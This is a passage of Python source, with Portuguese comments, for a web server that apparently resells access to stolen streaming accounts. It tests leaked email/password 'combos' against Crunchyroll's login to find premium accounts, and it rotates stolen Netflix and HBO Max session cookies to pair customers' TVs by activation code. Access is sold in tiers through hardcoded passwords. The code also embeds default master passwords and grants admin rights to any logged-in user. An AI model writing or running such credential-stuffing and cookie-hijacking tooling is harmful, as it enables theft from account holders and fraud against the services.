    if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
        return None

    with VALID_CRUNCHYROLL_LOCK:
        if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
            entry = VALID_CRUNCHYROLL_BY_EMAIL[email]
            if entry.get("exp", 0) > time.time() + 120:
                return entry

    session = crunchyroll.make_session()
    try:
        res = crunchyroll.check_account(session, email, pwd)
        status = res.get("status")

        if status == "premium":
            entry = {
                "file": fname,
                "email": email,
                "password": pwd,
                "access_token": res["access_token"],
                "exp": res.get("exp", int(time.time() + 3600)),
                "info": {
                    "email": email,
                    "plan": res.get("plan", "Crunchyroll FAN"),
                    "country": res.get("country", "BR"),
                    "benefits": res.get("benefits", [])
                },
                "validated": True
            }
            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL[email] = entry
                found = False
                for idx, e in enumerate(VALID_CRUNCHYROLL_POOL):
                    if e["email"] == email:
                        VALID_CRUNCHYROLL_POOL[idx] = entry
                        found = True
                        break
                if not found:
                    VALID_CRUNCHYROLL_POOL.append(entry)
            return entry
        elif status in ["bad", "free"]:
            DEAD_CRUNCHYROLL_ACCOUNTS.add(email)
            return None
        else:
            return None
    except Exception:
        return None
    finally:
        session.close()

def find_crunchyroll_valid_account() -> Optional[dict]:
    """Retorna uma conta Crunchyroll premium válida e com token ativo pronta para a TV."""
    now = time.time()
    with VALID_CRUNCHYROLL_LOCK:
        for entry in list(VALID_CRUNCHYROLL_POOL):
            email = entry["email"]
            if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
                continue
            if entry.get("exp", 0) > now + 60:
                return entry

    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    for email, pwd, fname in combos:
        if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
            continue
        valid = test_crunchyroll_account(email, pwd, fname)
        if valid:
            return valid

    return None

def select_crunchyroll_account_by_identifier(identifier: str) -> Optional[dict]:
    """Busca conta específica por email ou arquivo e a valida."""
    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    target = identifier.strip().lower()
    # 1. Busca exata por email primeiro
    for email, pwd, fname in combos:
        if email.strip().lower() == target:
            valid = test_crunchyroll_account(email, pwd, fname)
            if valid:
                return valid
    # 2. Busca por nome do arquivo
    for email, pwd, fname in combos:
        if fname.strip().lower() == target:
            valid = test_crunchyroll_account(email, pwd, fname)
            if valid:
                return valid
    # 3. Busca parcial por email
    for email, pwd, fname in combos:
        if target in email.strip().lower():
            valid = test_crunchyroll_account(email, pwd, fname)
            if valid:
                return valid
    return None

def activate_crunchyroll_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Envia código de ativação da TV para a Crunchyroll."""
    clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()
    if len(clean_code) < 6:
        return False, "O código de ativação da TV deve ter no mínimo 6 caracteres.", None

    if not account_data or "email" not in account_data:
        return False, "Nenhuma credencial válida da Crunchyroll encontrada.", None

    # Sempre obtém ou valida um token fresco diretamente com a Crunchyroll antes do envio
    session = crunchyroll.make_session()
    try:
        fresh_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
        if fresh_login.get("status") == "premium" and fresh_login.get("access_token"):
            account_data["access_token"] = fresh_login["access_token"]
            account_data["exp"] = fresh_login.get("exp", int(time.time() + 3600))
            if "info" in account_data:
                account_data["info"]["plan"] = fresh_login.get("plan", account_data["info"].get("plan"))
                account_data["info"]["country"] = fresh_login.get("country", account_data["info"].get("country"))
    except Exception:
        pass
    finally:
        session.close()

    if not account_data.get("access_token"):
        return False, "Não foi possível obter uma sessão ativa da Crunchyroll. Verifique seus combos.", None

    success, msg, info_resp = crunchyroll.ativar_tv(account_data["access_token"], clean_code)

    # Se falhou por motivo de token, 401 ou 403, tenta re-autenticar de imediato
    if not success and any(k in msg.lower() for k in ["token", "sessão", "401", "403"]):
        session = crunchyroll.make_session()
        try:
            retry_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
            if retry_login.get("status") == "premium" and retry_login.get("access_token"):
                account_data["access_token"] = retry_login["access_token"]
                retry_success, retry_msg, _ = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
                if retry_success:
                    return True, retry_msg, account_data["info"]
                else:
                    msg = retry_msg
        except Exception:
            pass
        finally:
            session.close()

    if success:
        return True, msg, account_data["info"]
    else:
        return False, msg, None

def get_verified_crunchyroll_accounts(min_count: int = 1) -> List[dict]:
    return get_all_crunchyroll_accounts()

def start_background_crunchyroll_validator():
    """Validador em background para manter sempre contas Crunchyroll prontas."""
    def _worker():
        global CURRENT_CRUNCHYROLL_READY
        time.sleep(2)
        while True:
            try:
                acc = find_crunchyroll_valid_account()
                if acc and CURRENT_CRUNCHYROLL_READY is None:
                    CURRENT_CRUNCHYROLL_READY = acc
            except Exception:
                pass
            time.sleep(45)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_crunchyroll_validator()

# ═══════════════════════════════════════════════════════════════
#  SERVIDOR HTTP & API REST
# ═══════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════
#  AUTENTICAÇÃO & SEGURANÇA REFORÇADA (HARDENED SECURITY)
# ═══════════════════════════════════════════════════════════════
def get_master_password() -> str:
    env_pass = os.environ.get("MASTER_PASSWORD")
    if env_pass:
        return env_pass.strip()
    return "ATIVADOR#MASTER@2026$STREAM*VIP!"

def get_cookie_admin_password() -> str:
    env_pass = os.environ.get("COOKIE_ADMIN_PASSWORD")
    if env_pass:
        return env_pass.strip()
    return "ADMIN#COOKIES@7739$VIP*VAULT!2026"

MASTER_PASSWORD = get_master_password()
COOKIE_ADMIN_PASSWORD = get_cookie_admin_password()
TOKEN_TTL_SECONDS = int(os.environ.get("TOKEN_TTL_SECONDS", 86400)) # 24 Horas de validade por token
CONFIG_SENHAS_FILE = os.path.join(BASE_DIR, "config_senhas.json")

# Estrutura padrão de senhas e permissões
DEFAULT_ACCESS_CONFIG = {
    "senhas": [
        {
            "senha": get_master_password(),
            "nome": "Master Total (Tudo Liberado)",
            "servicos": ["netflix", "hbo", "crunchyroll"],
            "descricao": "Desbloqueia Netflix, HBO Max e Crunchyroll"
        },
        {
            "senha": "VIP#TOTAL",
            "nome": "Acesso VIP Completo",
            "servicos": ["netflix", "hbo", "crunchyroll"],
            "descricao": "Desbloqueia Netflix, HBO Max e Crunchyroll"
        },
        {
            "senha": "PASS#STREAM",
            "nome": "Netflix + HBO Max",
            "servicos": ["netflix", "hbo"],
            "descricao": "Desbloqueia Netflix e HBO Max (Crunchyroll bloqueada com cadeado)"
        },
        {
            "senha": "PASS#NETFLIX",
            "nome": "Apenas Netflix",
            "servicos": ["netflix"],
            "descricao": "Desbloqueia apenas a Netflix"
        },
        {
            "senha": "PASS#HBO",
            "nome": "Apenas HBO Max",
            "servicos": ["hbo"],
            "descricao": "Desbloqueia apenas a HBO Max"
        },
        {
            "senha": "PASS#CRUNCHYROLL",
            "nome": "Apenas Crunchyroll",
            "servicos": ["crunchyroll"],
            "descricao": "Desbloqueia apenas a Crunchyroll"
        }
    ]
}

def load_access_keys() -> List[dict]:
    """Carrega dinamicamente a lista de senhas e seus serviços permitidos."""
    if not os.path.exists(CONFIG_SENHAS_FILE):
        try:
            with open(CONFIG_SENHAS_FILE, 'w', encoding='utf-8') as f:
                json.dump(DEFAULT_ACCESS_CONFIG, f, indent=2, ensure_ascii=False)
        except Exception:
            pass
        return DEFAULT_ACCESS_CONFIG["senhas"]

    try:
        with open(CONFIG_SENHAS_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data.get("senhas", DEFAULT_ACCESS_CONFIG["senhas"])
    except Exception:
        return DEFAULT_ACCESS_CONFIG["senhas"]

def find_access_role(password: str) -> Optional[dict]:
    """Busca a configuração de acesso correspondente à senha informada."""
    keys = load_access_keys()
    p_clean = password.strip()
    for item in keys:
        if hmac.compare_digest(p_clean, item.get("senha", "").strip()):
            return item
    if hmac.compare_digest(p_clean, get_master_password().strip()):
        return {
            "senha": get_master_password(),
            "nome": "Master Total",
            "servicos": ["netflix", "hbo", "crunchyroll"]
        }
    return None

ACTIVE_SESSIONS: Dict[str, dict] = {} # token -> {"exp": float, "services": list, "role_name": str}
ACTIVE_ADMIN_SESSIONS: Dict[str, float] = {} # admin_token -> expiry_timestamp
SESSION_CACHE_FILE = os.path.join(BASE_DIR, ".session_cache.json")

def load_active_sessions():
    global ACTIVE_SESSIONS
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                now = time.time()
                clean = {}
                for t, val in data.items():
                    if isinstance(val, (int, float)):
                        if val > now:
                            clean[t] = {"exp": float(val), "services": ["netflix", "hbo", "crunchyroll"], "role_name": "Master Total"}
                    elif isinstance(val, dict):
                        if val.get("exp", 0) > now:
                            clean[t] = val
                ACTIVE_SESSIONS = clean
        except Exception:
            pass

def save_active_sessions():
    try:
        with open(SESSION_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(ACTIVE_SESSIONS, f)
    except Exception:
        pass

load_active_sessions()

LOGIN_LOCK = threading.Lock()
LOGIN_ATTEMPTS: Dict[str, dict] = {} # ip -> {"count": int, "blocked_until": float}
ACTIVATION_RATE_LIMIT: Dict[str, list] = {} # ip -> list of timestamps

CURRENT_NETFLIX_READY: Optional[dict] = None
CURRENT_HBO_READY: Optional[dict] = None
CURRENT_CRUNCHYROLL_READY: Optional[dict] = None

class AppRequestHandler(SimpleHTTPRequestHandler):
    def send_security_headers(self):
        """Cabeçalhos avançados de proteção contra XSS, Clickjacking, MIME-sniffing, Injeções e Cache."""
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('X-Frame-Options', 'SAMEORIGIN')
        self.send_header('X-XSS-Protection', '1; mode=block')
        self.send_header('Referrer-Policy', 'strict-origin-when-cross-origin')
        self.send_header('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com data:; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https:;")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Auth-Token, X-Admin-Token, X-Admin-Pass, X-Requested-With')
        self.send_header('Access-Control-Max-Age', '86400')

    def end_headers(self):
        self.send_security_headers()
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    def get_client_ip(self):
        xff = self.headers.get('X-Forwarded-For')
        if xff:
            return xff.split(',')[0].strip()
        return self.client_address[0] if self.client_address else "127.0.0.1"

    def get_session_info(self) -> Optional[dict]:
        auth_header = self.headers.get('Authorization', '')
        token = ''
        if auth_header.startswith('Bearer '):
            token = auth_header[7:].strip()
        elif 'X-Auth-Token' in self.headers:
            token = self.headers.get('X-Auth-Token', '').strip()
        
        if not token:
            return None

        now = time.time()
        with LOGIN_LOCK:
            expired = [t for t, s_data in ACTIVE_SESSIONS.items() if s_data.get("exp", 0) < now]
            for exp_token in expired:
                ACTIVE_SESSIONS.pop(exp_token, None)

            if token in ACTIVE_SESSIONS:
                s_data = ACTIVE_SESSIONS[token]
                if s_data.get("exp", 0) > now:
                    return s_data
                else:
                    ACTIVE_SESSIONS.pop(token, None)
                    return None
            return None

    def is_authenticated(self):
        return self.get_session_info() is not None

    def is_service_allowed(self, service: str) -> bool:
        session = self.get_session_info()
        if not session:
            return False
        services = session.get("services", ["netflix", "hbo", "crunchyroll"])
        return service in services

    def is_admin_authenticated(self):
        # 1. Se o usuário já autenticou com a senha mestre no terminal, concede acesso direto!
        if self.is_authenticated():
            return True

        admin_header = self.headers.get('X-Admin-Token', '') or self.headers.get('Authorization', '')
        token = ''
        if admin_header.startswith('Bearer '):
            token = admin_header[7:].strip()
        else:
            token = admin_header.strip()
        
        if not token:
            return False

        now = time.time()
        with LOGIN_LOCK:
            if token in ACTIVE_ADMIN_SESSIONS:
                if ACTIVE_ADMIN_SESSIONS[token] > now:
                    return True
                else:
                    ACTIVE_ADMIN_SESSIONS.pop(token, None)
                    return False
            return False

    def handle_api_verify_admin_pass(self):
        # Se já estiver autenticado com token mestre, concede admin token imediatamente
        if self.is_authenticated():
            now = time.time()
            admin_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_ADMIN_SESSIONS[admin_token] = now + 43200
            return self.send_json_response({
                "success": True,
                "admin_token": admin_token,
                "message": "Acesso administrativo aos cookies concedido!"
            })

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        password = req.get('password', '').strip()

        # Aceita tanto a senha do cofre quanto a senha mestre para facilidade do usuário!
        is_valid = hmac.compare_digest(password, get_cookie_admin_password()) or hmac.compare_digest(password, get_master_password())

        if is_valid:
            now = time.time()
            admin_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_ADMIN_SESSIONS[admin_token] = now + 43200 # 12 horas
            return self.send_json_response({
                "success": True,
                "admin_token": admin_token,
                "message": "Acesso administrativo aos cookies concedido!"
            })
        else:
            return self.send_json_response({
                "success": False,
                "message": "Senha do gerenciador de cookies incorreta!"
            }, 401)

    def handle_api_login(self):
        ip = self.get_client_ip()
        now = time.time()
        
        with LOGIN_LOCK:
            record = LOGIN_ATTEMPTS.get(ip, {"count": 0, "blocked_until": 0})
            if record["blocked_until"] > now:
                wait_sec = int(record["blocked_until"] - now)
                return self.send_json_response({
                    "success": False, 
                    "message": f"Muitas tentativas. IP bloqueado temporariamente por mais {wait_sec} segundos."
                }, 429)

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        password = req.get('password', '').strip()

        role = find_access_role(password)

        with LOGIN_LOCK:
            if role is not None:
                LOGIN_ATTEMPTS.pop(ip, None)
                new_token = secrets.token_hex(32)
                allowed_services = role.get("servicos", ["netflix", "hbo", "crunchyroll"])
                role_name = role.get("nome", "Acesso Autorizado")
                ACTIVE_SESSIONS[new_token] = {
                    "exp": now + TOKEN_TTL_SECONDS,
                    "services": allowed_services,
                    "role_name": role_name
                }
                save_active_sessions()
                return self.send_json_response({
                    "success": True,
                    "token": new_token,
                    "allowed_services": allowed_services,
                    "role_name": role_name,
                    "expires_in": TOKEN_TTL_SECONDS,
                    "message": f"Terminal desbloqueado ({role_name})."
                })
            else:
                record["count"] += 1
                # Bloqueio progressivo inteligente
                if record["count"] >= 10:
                    lock_time = 900 # 15 minutos
                elif record["count"] >= 8:
                    lock_time = 300 # 5 minutos
                elif record["count"] >= 5:
                    lock_time = 60  # 1 minuto
                else:
                    lock_time = 0

                if lock_time > 0:
                    record["blocked_until"] = now + lock_time
                    LOGIN_ATTEMPTS[ip] = record
                    return self.send_json_response({
                        "success": False,
                        "message": f"Tentativas excedidas! Terminal bloqueado por {lock_time} segundos por segurança."
                    }, 429)
                else:
                    LOGIN_ATTEMPTS[ip] = record
                    remaining = 5 - record["count"]
                    return self.send_json_response({
                        "success": False,
                        "message": f"Senha incorreta. Restam {remaining} tentativas antes do bloqueio temporário."
                    }, 401)

    def handle_api_logout(self):
        auth_header = self.headers.get('Authorization', '')
        token = ''
        if auth_header.startswith('Bearer '):
            token = auth_header[7:].strip()
        elif 'X-Auth-Token' in self.headers:
            token = self.headers.get('X-Auth-Token', '').strip()
        with LOGIN_LOCK:
            ACTIVE_SESSIONS.pop(token, None)
            save_active_sessions()
        return self.send_json_response({"success": True, "message": "Terminal bloqueado."})

    def handle_api_verify_token(self):
        session = self.get_session_info()
        if session:
            return self.send_json_response({
                "authenticated": True,
                "allowed_services": session.get("services", ["netflix", "hbo", "crunchyroll"]),
                "role_name": session.get("role_name", "Acesso Autorizado")
            })
        return self.send_json_response({"authenticated": False}, 401)

    def check_rate_limit(self, max_requests: int = 15, window_seconds: int = 30) -> bool:
        """Rate limiting por IP para proteger endpoints sensíveis contra spam/DDoS e vazamento de memória."""
        ip = self.get_client_ip()
        now = time.time()
        with LOGIN_LOCK:
            # Limpeza preventiva periódica de IPs inativos para evitar vazamento de memória
            if len(ACTIVATION_RATE_LIMIT) > 200:
                expired_ips = [k for k, v in ACTIVATION_RATE_LIMIT.items() if not v or now - v[-1] > 3600]
                for k in expired_ips:
                    ACTIVATION_RATE_LIMIT.pop(k, None)
            if len(LOGIN_ATTEMPTS) > 200:
                expired_login = [k for k, v in LOGIN_ATTEMPTS.items() if now > v.get("blocked_until", 0) + 3600]
                for k in expired_login:
                    LOGIN_ATTEMPTS.pop(k, None)

            timestamps = ACTIVATION_RATE_LIMIT.get(ip, [])
            timestamps = [t for t in timestamps if now - t < window_seconds]
            if len(timestamps) >= max_requests:
                return False
            timestamps.append(now)
            ACTIVATION_RATE_LIMIT[ip] = timestamps
            return True

    def serve_index_html(self):
        """Serve com exclusividade e segurança a página inicial index.html."""
        index_path = os.path.join(BASE_DIR, "index.html")
        if not os.path.exists(index_path):
            self.send_error(404, "Arquivo index.html não encontrado.")
            return

        try:
            with open(index_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_error(500, "Erro interno ao carregar a interface.")

    def do_GET(self):
        # Normalização do caminho (proteção contra path traversal como /../)
        raw_path = self.path.split('?')[0]

        if raw_path == '/api/ping':
            # Keep-Alive endpoint público para evitar que a instância durma
            return self.send_json_response({
                "status": "alive",
                "uptime": "24/7",
                "timestamp": time.time(),
                "service": "CYBER_DECK_KERNEL_ONLINE"
            })
        elif raw_path == '/api/status':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_status()
        elif raw_path == '/api/admin/stats':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_admin_stats()
        elif raw_path == '/api/history':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_history()
        elif raw_path.startswith('/api/cookies'):
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_cookies()
        elif raw_path in ['/', '/index.html', '/index.htm', '']:
            self.serve_index_html()
        elif raw_path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
        else:
            # 🛡️ BLOQUEIO TOTAL DE SEGURANÇA:
            # NUNCA serve arquivos como cookies/, SENHA_MESTRE.txt, app.py, tv2.py, used_cookies.json etc.
            self.send_error(403, "Acesso Proibido: Recurso confidencial e protegido.")

    def do_POST(self):
        raw_path = self.path.split('?')[0]

        if raw_path == '/api/login':
            self.handle_api_login()
        elif raw_path == '/api/logout':
            self.handle_api_logout()
        elif raw_path == '/api/verify-token':
            self.handle_api_verify_token()
        elif raw_path == '/api/admin/verify-pass':
            self.handle_api_verify_admin_pass()
        elif raw_path == '/api/activate':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            if not self.check_rate_limit(max_requests=10, window_seconds=30):
                return self.send_json_response({"success": False, "message": "Muitas ativações em sequência. Aguarde alguns instantes por segurança."}, 429)
            self.handle_api_activate()
        elif raw_path == '/api/skip-cookie':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_skip_cookie()
        elif raw_path == '/api/select-cookie':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_select_cookie()
        elif raw_path == '/api/filter-plan':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_filter_plan()
        elif raw_path == '/api/admin/upload-cookies':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_upload_cookies()
        elif raw_path == '/api/admin/reset-cache':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_reset_cache()
        else:
            self.send_error(404, "Endpoint not found")

    def send_json_response(self, data: dict, status_code: int = 200):
        body = json.dumps(data, ensure_ascii=False).encode('utf-8')
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def handle_api_status(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY

        if CURRENT_NETFLIX_READY is None or (CURRENT_NETFLIX_READY and (CURRENT_NETFLIX_READY.get("file") in DEAD_NETFLIX_COOKIES or CURRENT_NETFLIX_READY.get("file") in tv2.USED_COOKIES)):
            CURRENT_NETFLIX_READY = find_netflix_valid_cookie()
        
        if CURRENT_HBO_READY is None or (CURRENT_HBO_READY and CURRENT_HBO_READY.get("file") in USED_HBO_COOKIES):
            CURRENT_HBO_READY = find_hbo_valid_cookie()

        if CURRENT_CRUNCHYROLL_READY is None or (CURRENT_CRUNCHYROLL_READY and (CURRENT_CRUNCHYROLL_READY.get("email") in DEAD_CRUNCHYROLL_ACCOUNTS or CURRENT_CRUNCHYROLL_READY.get("email") in USED_CRUNCHYROLL_ACCOUNTS)):
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()

        all_netflix = get_all_netflix_accounts()
        active_nf_file = CURRENT_NETFLIX_READY["file"] if CURRENT_NETFLIX_READY else ""
        active_nf_bname = os.path.basename(active_nf_file) if active_nf_file else ""

        nf_queue = [
            {
                "filename": os.path.basename(e["file"]),
                "email": e["info"].get("email", os.path.basename(e["file"])),
                "country": e["info"].get("country", "BR"),
                "plan": e["info"].get("plan", "Premium VIP"),
                "is_selected": (os.path.basename(e["file"]) == active_nf_bname),
                "is_verified": e.get("validated", False)
            }
            for e in all_netflix if os.path.basename(e["file"]) != active_nf_bname
        ]

        all_hbo = get_all_hbo_accounts()
        active_hbo_file = CURRENT_HBO_READY["file"] if CURRENT_HBO_READY else ""
        active_hbo_bname = os.path.basename(active_hbo_file) if active_hbo_file else ""

        hbo_queue = [
            {
                "filename": os.path.basename(e["file"]),
                "email": e["info"].get("email", "HBO Max VIP"),
                "country": e["info"].get("country", "BR"),
                "plan": e["info"].get("plan", "HBO Max VIP"),
                "is_selected": (os.path.basename(e["file"]) == active_hbo_bname),
                "is_verified": e.get("validated", False)
            }
            for e in all_hbo if os.path.basename(e["file"]) != active_hbo_bname
        ]

        all_cr = get_all_crunchyroll_accounts()
        active_cr_email = CURRENT_CRUNCHYROLL_READY["email"] if CURRENT_CRUNCHYROLL_READY else ""

        cr_queue = [
            {
                "filename": e.get("file") or e.get("email", "combo"),
                "email": e["info"].get("email", e.get("file", "Crunchyroll VIP")),
                "country": e["info"].get("country", "BR"),
                "plan": e["info"].get("plan", "Crunchyroll FAN"),
                "is_selected": (e.get("email") == active_cr_email),
                "is_verified": e.get("validated", False)
            }
            for e in all_cr if e.get("email") != active_cr_email
        ]

        nf_count = len(all_netflix)
        hbo_count = len(all_hbo)
        cr_count = len(all_cr)

        res = {
            "netflix": {
                "total_in_vault": nf_count,
                "available_count": nf_count,
                "has_account": CURRENT_NETFLIX_READY is not None,
                "account": CURRENT_NETFLIX_READY["info"] if CURRENT_NETFLIX_READY else None,
                "cookie_name": os.path.basename(CURRENT_NETFLIX_READY["file"]) if CURRENT_NETFLIX_READY else None,
                "cookie_queue": nf_queue
            },
            "hbo": {
                "total_in_vault": hbo_count,
                "available_count": hbo_count,
                "has_account": CURRENT_HBO_READY is not None,
                "account": CURRENT_HBO_READY["info"] if CURRENT_HBO_READY else None,
                "cookie_name": os.path.basename(CURRENT_HBO_READY["file"]) if CURRENT_HBO_READY else None,
                "cookie_queue": hbo_queue
            },
            "crunchyroll": {
                "total_in_vault": cr_count,
                "available_count": cr_count,
                "has_account": CURRENT_CRUNCHYROLL_READY is not None,
                "account": CURRENT_CRUNCHYROLL_READY["info"] if CURRENT_CRUNCHYROLL_READY else None,
                "cookie_name": CURRENT_CRUNCHYROLL_READY.get("email") if CURRENT_CRUNCHYROLL_READY else None,
                "cookie_queue": cr_queue
            },
            "local_ip": get_local_ip(),
            "port": PORT
        }

        session = self.get_session_info()
        res["allowed_services"] = session.get("services", ["netflix", "hbo", "crunchyroll"]) if session else ["netflix", "hbo", "crunchyroll"]
        res["role_name"] = session.get("role_name", "Acesso Autorizado") if session else ""
        res["server_version"] = SERVER_DATA_VERSION

        self.send_json_response(res)

    def handle_api_skip_cookie(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        service = req.get('service', 'netflix')

        if not self.is_service_allowed(service):
            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)

        if service == 'netflix':
            if CURRENT_NETFLIX_READY:
                DEAD_NETFLIX_COOKIES.add(CURRENT_NETFLIX_READY["file"])
                tv2.USED_COOKIES.add(CURRENT_NETFLIX_READY["file"])
            CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        elif service == 'crunchyroll':
            if CURRENT_CRUNCHYROLL_READY:
                DEAD_CRUNCHYROLL_ACCOUNTS.add(CURRENT_CRUNCHYROLL_READY["email"])
                USED_CRUNCHYROLL_ACCOUNTS.add(CURRENT_CRUNCHYROLL_READY["email"])
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        else:
            if CURRENT_HBO_READY:
                USED_HBO_COOKIES.add(CURRENT_HBO_READY["file"])
            CURRENT_HBO_READY = find_hbo_valid_cookie()

        self.handle_api_status()

    def handle_api_activate(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8'))
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido na requisição."}, 400)

        service = req.get('service', 'netflix')

        # 🔒 Bloqueio rigoroso se a senha não tiver acesso a este streaming
        if not self.is_service_allowed(service):
            s_name = "Crunchyroll" if service == 'crunchyroll' else ("HBO Max" if service == 'hbo' else "Netflix")
            return self.send_json_response({
                "success": False,
                "message": f"🔒 VOCÊ NÃO TEM ACESSO A ESSE CONTEÚDO! ({s_name} bloqueado pela sua senha)."
            }, 403)

        tv_code = req.get('code', '').strip()

        if not tv_code:
            return self.send_json_response({"success": False, "message": "Por favor, digite o código exibido na TV."}, 400)

        clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()

        if service == 'netflix':
            if CURRENT_NETFLIX_READY is None:
                CURRENT_NETFLIX_READY = find_netflix_fast_cookie()

            if not CURRENT_NETFLIX_READY:
                return self.send_json_response({
                    "success": False,
                    "message": "Nenhum cookie Netflix válido disponível no momento."
                }, 404)

            used_file = CURRENT_NETFLIX_READY["file"]
            success, msg, info = activate_netflix_tv(clean_code, CURRENT_NETFLIX_READY)
            account_info = info or CURRENT_NETFLIX_READY.get("info", {})

            if success:
                tv2.USED_COOKIES.add(used_file)
                DEAD_NETFLIX_COOKIES.add(used_file)
                record_history_entry("Netflix", used_file, account_info.get("email", ""), clean_code, account_info.get("plan", "Netflix"), "Sucesso")
                CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=used_file)
                return self.send_json_response({
                    "success": True,
                    "message": msg,
                    "account": account_info
                })
            else:
                DEAD_NETFLIX_COOKIES.add(used_file)
                tv2.USED_COOKIES.add(used_file)
                CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=used_file)
                return self.send_json_response({
                    "success": False,
                    "message": msg or "Falha ao parear com a TV."
                })

        elif service == 'hbo':
            if CURRENT_HBO_READY is None:
                CURRENT_HBO_READY = find_hbo_valid_cookie()

            if not CURRENT_HBO_READY:
                return self.send_json_response({
                    "success": False,
                    "message": "Nenhum cookie HBO Max ativo encontrado nas pastas."
                }, 404)

            used_file = CURRENT_HBO_READY["file"]
            success, msg, info = activate_hbo_tv(clean_code, CURRENT_HBO_READY)
            account_info = info or CURRENT_HBO_READY.get("info", {})

            if success:
                USED_HBO_COOKIES.add(used_file)
                record_history_entry("HBO Max", used_file, account_info.get("email", ""), clean_code, account_info.get("plan", "HBO Max VIP"), "Sucesso")
                CURRENT_HBO_READY = find_hbo_valid_cookie()
                return self.send_json_response({
                    "success": True,
                    "message": msg,
                    "account": account_info
                })
            else:
                if "expirou" in msg.lower():
                    CURRENT_HBO_READY = find_hbo_valid_cookie()
                return self.send_json_response({
                    "success": False,
                    "message": msg
                })

        elif service == 'crunchyroll':
            if CURRENT_CRUNCHYROLL_READY is None:
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()

            if not CURRENT_CRUNCHYROLL_READY:
                return self.send_json_response({
                    "success": False,
                    "message": "Nenhuma conta Crunchyroll premium encontrada nos combos."
